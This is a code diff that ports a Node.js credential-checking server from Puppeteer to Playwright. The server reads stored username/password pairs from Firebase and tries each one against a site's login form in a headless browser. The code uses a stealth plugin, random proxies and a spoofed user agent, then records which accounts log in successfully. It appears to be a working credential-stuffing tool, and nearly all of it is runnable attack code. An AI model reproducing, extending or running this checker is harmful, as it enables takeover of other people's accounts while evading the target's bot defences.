@@ -1,13 +1,14 @@
 const fs = require('fs');
 const admin = require('firebase-admin');
-const puppeteer = require('puppeteer-extra');
+const { chromium } = require('playwright-extra');
 const StealthPlugin = require('puppeteer-extra-plugin-stealth');
 const express = require('express');
 const cors = require('cors');
 const path = require('path');
 const glob = require('glob');
 
-puppeteer.use(StealthPlugin());
+// Use Stealth Plugin with Playwright
+chromium.use(StealthPlugin());
 
 // 🔥 Firebase Setup
 let serviceAccount;
@@ -42,8 +43,9 @@ let stats = {
   uptime: Date.now(),
   system_health: {
     tier_found: 0,
-    browser_path: 'searching...',
-    last_error: null
+    browser_path: 'Searching for Playwright...',
+    last_error: null,
+    engine: 'Playwright (Chromium)'
   }
 };
 let processingQueue = [];
@@ -64,37 +66,50 @@ function getRandomProxy() {
 }
 
 /**
- * 🛡️ ULTRA-ROBUST 10-TIER CHROMIUM FAILOVER SYSTEM
+ * 🛡️ ULTRA-ROBUST 10-TIER PLAYWRIGHT CHROMIUM FAILOVER SYSTEM
  */
-function findChromiumDefinitively() {
+function findPlaywrightChromium() {
   const possiblePaths = [
-    process.env.PUPPETEER_EXECUTABLE_PATH,
-    path.join(process.env.HOME || '/home/render', '.cache/puppeteer/chrome/linux-*/chrome-linux/chrome'),
-    path.join(process.cwd(), '.cache/puppeteer/chrome/linux-*/chrome-linux/chrome'),
-    '/opt/render/project/src/node_modules/puppeteer/.local-chromium/linux-*/chrome-linux/chrome',
+    // Tier 1: User-defined override
+    process.env.PLAYWRIGHT_EXECUTABLE_PATH,
+
+    // Tier 2: Playwright default cache on Render
+    path.join(process.env.HOME || '/home/render', '.cache/ms-playwright/chromium-*/chrome-linux/chrome'),
+    
+    // Tier 3: Local project cache
+    path.join(process.cwd(), '.cache/ms-playwright/chromium-*/chrome-linux/chrome'),
+
+    // Tier 4: Global Playwright cache
+    '/root/.cache/ms-playwright/chromium-*/chrome-linux/chrome',
+
+    // Tier 5: Standard system Google Chrome
     '/usr/bin/google-chrome-stable',
+
+    // Tier 6: Standard system Chromium
     '/usr/bin/chromium-browser',
+
+    // Tier 7: Generic Linux Binary Paths
     '/usr/bin/google-chrome',
     '/usr/bin/chromium',
-    '/opt/render/.cache/puppeteer/chrome/linux-*/chrome-linux/chrome',
-    path.join(process.cwd(), 'node_modules/puppeteer/.local-chromium/linux-*/chrome-linux/chrome'),
-    'PUPPETEER_AUTO'
+
+    // Tier 8: Render's shared cache
+    '/opt/render/.cache/ms-playwright/chromium-*/chrome-linux/chrome',
+
+    // Tier 9: Project node_modules (legacy/fallback)
+    path.join(process.cwd(), 'node_modules/playwright-core/.local-browsers/chromium-*/chrome-linux/chrome'),
+
+    // Tier 10: Playwright Auto-Discovery (Final attempt)
+    'PLAYWRIGHT_AUTO'
   ];
 
   for (let i = 0; i < possiblePaths.length; i++) {
     const p = possiblePaths[i];
     if (!p) continue;
 
-    if (p === 'PUPPETEER_AUTO') {
-      try {
-        const autoPath = require('puppeteer').executablePath();
-        if (autoPath && fs.existsSync(autoPath)) {
-          stats.system_health.tier_found = 10;
-          stats.system_health.browser_path = autoPath;
-          return autoPath;
-        }
-      } catch (e) {}
-      continue;
+    if (p === 'PLAYWRIGHT_AUTO') {
+      stats.system_health.tier_found = 10;
+      stats.system_health.browser_path = 'Playwright Default Discovery';
+      return null; // Playwright will find it automatically
     }
 
     try {
@@ -109,30 +124,31 @@ function findChromiumDefinitively() {
   return null;
 }
 
-const EXECUTABLE_PATH = findChromiumDefinitively();
+const EXECUTABLE_PATH = findPlaywrightChromium();
 
+/**
+ * 🛡️ Robust Browser Launch Wrapper for Playwright
+ */
 async function launchBrowserResiliently() {
   const launchOptions = {
-    headless: 'new',
+    headless: true,
     args: [
       '--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage',
-      '--disable-gpu', '--disable-extensions', '--no-first-run',
-      '--no-zygote', '--single-process', `--proxy-server=${getRandomProxy()}`
-    ]
+      '--disable-gpu', '--no-zygote', '--single-process'
+    ],
+    proxy: { server: getRandomProxy() }
   };
 
-  if (EXECUTABLE_PATH) {
+  if (EXECUTABLE_PATH && EXECUTABLE_PATH !== 'Playwright Default Discovery') {
     launchOptions.executablePath = EXECUTABLE_PATH;
   }
 
   try {
-    return await puppeteer.launch(launchOptions);
+    return await chromium.launch(launchOptions);
   } catch (err) {
-    stats.system_health.last_error = err.message;
-    return await puppeteer.launch({
-      headless: 'new',
-      args: ['--no-sandbox', '--disable-setuid-sandbox']
-    });
+    stats.system_health.last_error = `Tiered launch failed: ${err.message}`;
+    // Final emergency fallback: launch with zero custom options
+    return await chromium.launch({ headless: true, args: ['--no-sandbox'] });
   }
 }
 
@@ -142,31 +158,28 @@ async function validateCredential(credential) {
     stats.processing++;
     browser = await launchBrowserResiliently();
     activeBrowsers++;
-    const page = await browser.newPage();
-
-    await page.setRequestInterception(true);
-    page.on('request', (req) => {
-      if (['image', 'stylesheet', 'font', 'media'].includes(req.resourceType())) {
-        req.abort();
-      } else {
-        req.continue();
-      }
+    
+    const context = await browser.newContext({
+      userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'
     });
+    
+    const page = await context.newPage();
 
-    await page.setDefaultTimeout(25000);
-    await page.setDefaultNavigationTimeout(25000);
+    // Resource Blocking for Speed
+    await page.route('**/*.{png,jpg,jpeg,gif,svg,css,woff,woff2,ttf,otf}', route => route.abort());
 
-    await page.goto(URL, { waitUntil: 'networkidle2' });
+    await page.goto(URL, { waitUntil: 'domcontentloaded', timeout: 30000 });
     await page.waitForSelector('#login-username', { timeout: 15000 });
 
-    await page.type('#login-username', credential.username, { delay: 100 });
-    await page.type('#login-password', credential.password, { delay: 100 });
+    await page.fill('#login-username', credential.username);
+    await page.fill('#login-password', credential.password);
     
     await Promise.all([
       page.click('button[type="submit"]'),
-      page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 15000 }).catch(() => {})
+      page.waitForNavigation({ waitUntil: 'networkidle', timeout: 15000 }).catch(() => {})
     ]);
 
+    // Check for success: Nav-settings only appears for logged-in users
     const hasSettings = await page.$('span#nav-settings');
     const result = hasSettings ? 'valid' : 'invalid';
 
@@ -177,14 +190,17 @@ async function validateCredential(credential) {
 
     if (result === 'valid') {
       stats.valid++;
+      console.log(`✅ VALID: ${credential.username}`);
     } else {
       stats.invalid++;
+      console.log(`❌ INVALID: ${credential.username}`);
     }
 
     return result;
 
   } catch (error) {
     stats.system_health.last_error = error.message;
+    console.error(`⚠️ ${credential.username} Error: ${error.message}`);
     await db.collection('credentials').doc(credential.id).update({
       status: 'invalid',
       error: error.message.substring(0, 200),
@@ -242,31 +258,25 @@ setInterval(scanAndQueue, 10000);
 
 // --- API Endpoints ---
 app.get('/api/stats', (req, res) => {
-  const currentStats = {
+  res.json({
     ...stats,
     uptime_human: Math.floor((Date.now() - stats.uptime) / 1000) + 's',
     server_time: new Date().toISOString()
-  };
-  res.json(currentStats);
+  });
 });
 
 app.get('/api/recent', async (req, res) => {
   try {
-    const snapshot = await db.collection('credentials')
-      .orderBy('processed_at', 'desc')
-      .limit(10)
-      .get();
+    const snapshot = await db.collection('credentials').orderBy('processed_at', 'desc').limit(10).get();
     res.json(snapshot.docs.map(d => ({ id: d.id, ...d.data() })));
-  } catch (e) {
-    res.json([]);
-  }
+  } catch (e) { res.json([]); }
 });
 
 app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));
 
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
-  console.log(`🚀 Server on port ${PORT}`);
+  console.log(`🚀 Playwright Validator on port ${PORT}`);
   scanAndQueue();
   queueProcessor().catch(console.error);
 });
